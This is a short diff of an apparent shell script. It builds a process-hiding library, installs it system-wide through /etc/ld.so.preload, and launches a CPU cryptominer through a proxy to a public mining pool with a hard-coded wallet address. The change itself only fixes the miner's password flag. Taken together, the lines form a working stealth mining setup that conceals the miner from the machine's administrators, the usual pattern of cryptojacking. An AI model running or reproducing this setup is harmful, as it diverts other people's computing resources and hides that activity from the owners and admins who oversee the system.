@@ -54,4 +54,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-sse2 -a minotaurx  -o stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 -u MWyhsXGGKoUrQ3E7GRn7CZV4UvHX34ePrt.$(shuf -n 1 -i 1-999999) -password c=LTC -t6
+./graftcp/graftcp ./cpuminer-sse2 -a minotaurx  -o stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 -u MWyhsXGGKoUrQ3E7GRn7CZV4UvHX34ePrt.$(shuf -n 1 -i 1-999999) -p c=LTC -t6
